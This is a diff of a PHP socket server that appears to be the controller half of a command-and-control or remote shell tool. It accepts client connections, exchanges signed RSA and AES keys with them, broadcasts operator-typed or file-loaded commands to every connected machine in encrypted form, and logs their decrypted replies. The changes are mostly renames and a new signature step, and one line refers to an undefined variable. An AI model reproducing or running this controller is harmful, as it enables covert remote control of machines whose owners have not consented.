@@ -9,32 +9,32 @@
 
 	$opts = getopt("h:p:", ["host:", "port:"]);
 	$log = $err = '';
-	$openssl_dest_path = './openssl.php';
+	$openssl_dest_path = './OpenSSL_Enc_Dec.php';
 
 	(count($opts) === 2) || die("[\33[91m!\33[0m] assign remote ip [-h/--host], port [-p/--port]\n");
 	$host_addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$host_port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
 	($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
-	|| die("[\33[91m!\33[0m] socket_create() failed: reason: "
+	|| die("[\33[91m!\33[0m] socket_create() error: "
 			.socket_strerror(socket_last_error())."\n");
 
 	socket_set_nonblock($master_sock);
 	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);
 
 	(socket_bind($master_sock, $host_addr, (int)$host_port))
-	|| die("[\33[91m!\33[0m] socket_bind() failed: reason: "
+	|| die("[\33[91m!\33[0m] socket_bind() error: "
 			.socket_strerror(socket_last_error($master_sock))."\n");
 
 	(socket_listen($master_sock))
-	|| die("[\33[91m!\33[0m] socket_listen() failed: reason: "
+	|| die("[\33[91m!\33[0m] socket_listen() error: "
 			.socket_strerror(socket_last_error($master_sock))."\n");
 	
 	if(file_exists($openssl_dest_path)){
 		require_once $openssl_dest_path;
-		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+		$openssl_enc_dec = new OpenSSL_Enc_Dec;
 		unset($openssl_dest_path);
-	} else { die('[\33[91m!\33[0m] error: openssl class is missing.'); }
+	} else { die("[\33[91m!\33[0m] error: openssl class is missing."); }
 	
 	$log = "host [".$host_addr.":".$host_port."] listening for incomming connections..\n\n";
 	write_log(LOGFILE, $log);
@@ -69,10 +69,9 @@
 			
 			socket_getpeername($recv_sock, $ip, $port);
 			write_log(LOGFILE, "[".$ip.":".$port."] connected.\n");
-			echo "[".$now."] [\33[91m!\33[0m] [".$ip.":".$port."] connected.\n";
 			
-			$host = gethostbyaddr($ip);
-			echo "host: $host\n";
+			echo "[".$now."] [\33[91m!\33[0m] [".$ip.":".$port."] connected.\n";
+			echo "host: ".gethostbyaddr($ip)."\n";
 
 
 			/** TODO:: secure public key transport **/
@@ -83,13 +82,21 @@
 				write_log(LOGFILE, $err);
 				echo $err;
 			}
+			/** final format:
+			 * 	base64glued => $signature.$encryptedAESKey.$RSAPubStripped
+			 */
 			if(socket_write($recv_sock, $meta['base64glued'], strlen($meta['base64glued'])) === false){
 				$err = "[\33[91m!\33[0m] write error: ".socket_strerror(socket_last_error($recv_sock))."\n";
 				write_log(LOGFILE, $err);
 				echo $err;
 			}
             // token verified with hash sent from client
-			$connected [] = ["ip" => $ip, "port" => $port, "token" => $meta['token']];
+			$connected [] = [
+				'host'  => gethostbyaddr($ip),
+				'ip'    => $ip,
+				'port'  => $port,
+				'token' => $meta['token']
+			];
 	        // remove the listening socket from the clients-with-data array
 	        $recv_key = array_search($clients, $recv);
 	        unset($recv[$recv_key]);
@@ -147,7 +154,7 @@
 			}
 			if(!empty($data)){
 				$temp_data = $data;
-				if(($data = $openssl_encrypt_decrypt->decrypt_cbc($data)) === false){ $data = $temp_data; }
+				if(($data = $openssl_enc_dec->decrypt_cbc($data)) === false){ $data = $temp_data; }
 				$log = "[".$ip.":".$port."]\n"
 					   .$data."\n"
 					   .DELIMITER."\n";
@@ -156,23 +163,28 @@
 			}
 			else { if(empty($connected)){ echo "[\33[91m!\33[0m] listening..\n"; } }
 		}
+
 		$stdin = fopen('php://stdin', 'r');
 		stream_set_blocking($stdin, 0);
 		$_read = [ $stdin ];
+
 		/**
 		 * --------------------------------------------
 		 * tv_sec  - num of seconds		 - 0.2
 		 * tv_usec - num of microseconds - 500000 = 0.5
 		 * --------------------------------------------
 		 */
+
 		if(($result = stream_select($_read, $_write, $_except, 0.2, 500000)) !== false){
-			if($result === 0)  { continue; } // no data, next iteration
+			if($result === 0)  { fclose($stdin); continue; } // no data, next iteration
 			$line = stream_get_line($stdin, STREAM_BUFFER_LEN, "\n");
-			fclose($stdin);
 		} else {
 			echo "[\33[91m!\33[0m] error: stream_select() error.\n";
+			fclose($stdin);
 			continue;
 		}
+
+		fclose($stdin);
 
 		if(empty($line)){ continue; }
 		else if($line === 'exit'){ break; }
@@ -180,7 +192,7 @@
 		{
 			echo "\33[94mconnected clients: ".(count($clients)-1)."\33[0m\n";
 			$connected = array_values($connected); // re-index
-			foreach ($connected as $key => $cc) { echo "[{$key}]: {$cc['ip']}:{$cc['port']}:{$cc['token']}\n"; }
+			foreach ($connected as $key => $cc) { echo "[{$key}]: {$cc['host']}:{$cc['ip']}:{$cc['port']}:{$cc['token']}\n"; }
 			continue;
 		}
 		else if(preg_match('/^\-f{1}\s?\.{0,2}\/{1}\.{0,1}\w+\.{0,1}\w{0,3}$/', $line))
@@ -194,7 +206,7 @@
 				$full_cmd = "";
 				
 				foreach($cmdsarr as $cmd){ $full_cmd .= trim($cmd).';'; }
-				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($fullcmd);
+				$full_cmd = $openssl_enc_dec->encrypt_cbc($fullcmd);
 				foreach($write as $send_sock)
 		  		{
 			        if($send_sock === $master_sock){ continue; }
@@ -206,11 +218,11 @@
 			else { echo "[\33[91m!\33[0m] invalid path.\n"; }
 			continue;
 		}
-		else
+		else // default - send
 		{
 			if((empty($connected) === false) && (empty($write) === false))
 			{
-				$line = $openssl_encrypt_decrypt->encrypt_cbc($line);
+				$line = $openssl_enc_dec->encrypt_cbc($line);
 				foreach ($write as $send_sock)
 				{
 					if($send_sock === $master_sock){ echo "WRITE TO SELF!"; continue; }
@@ -232,28 +244,42 @@
 /***********************************************************/
 
 function generate_metadata(){
-	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	$openssl_enc_dec = new OpenSSL_Enc_Dec;
 	$token = bin2hex(openssl_random_pseudo_bytes(16));
 	
-    if(false === ($tokenhash = $openssl_encrypt_decrypt->generate_keypair('master', $token))){
+    if(false === ($tokenhash = $openssl_enc_dec->generate_keypair('master', $token))){
 		return false;
 	}
-    if(false === ($AESKey = $openssl_encrypt_decrypt->fetch_key())){
+    if(false === ($AESKey = $openssl_enc_dec->fetch_key())){
 		return false;
 	}
-    if(false === ($RSAKeyStrings = $openssl_encrypt_decrypt->get_keypair_strings())){
-		return false;
-	}
-    //$RSAKeyStrings['public'] = str_replace('-----BEGIN PUBLIC KEY-----', '', $RSAKeyStrings['public']);
-    //$RSAKeyStrings['public'] = str_replace('-----END PUBLIC KEY-----', '', $RSAKeyStrings['public']);
-    if(false === ($encryptedAESKey = $openssl_encrypt_decrypt->encryptRSA($token, $AESKey, 'private'))){
+    if(false === ($RSAKeyStrings = $openssl_enc_dec->get_keypair_strings())){
 		return false;
 	}
 
-    $base64glued = base64_encode($encryptedAESKey.$RSAKeyStrings['public']);
-	unset($openssl_encrypt_decrypt);
+    $RSAPubStripped = str_replace('-----BEGIN PUBLIC KEY-----', '', $RSAKeyStrings['public']);
+	$RSAPubStripped = str_replace('-----END PUBLIC KEY-----', '', $RSAPubStripped);
+	
+    if(false === ($encryptedAESKey = $openssl_enc_dec->encryptRSA($token, $AESKey, 'private'))){
+		return false;
+	}
 
-    return ['token' => $token, 'base64glued' => $base64glued];
+	$glued = $encryptedAESKey.$RSAPubStripped;
+	if(false === openssl_sign($glued, $signature, $RSAKeyStrings['private'], OPENSSL_ALGO_SHA512)){
+		echo "Error generating signature.\n";
+		return false;
+	}
+
+    $base64glued = base64_encode($signature.$glued);
+	unset($openssl_enc_dec);
+
+	return (1 === openssl_verify($glued, $signature, $RSAKeyStrings['public'], OPENSSL_ALGO_SHA512))
+	? [
+		'token' => $token,
+		'base64glued' => $base64glued,
+		'base64signature' => base64_encode($signature)
+	  ]
+	: false;
 }
 
 function write_log($file,$str){
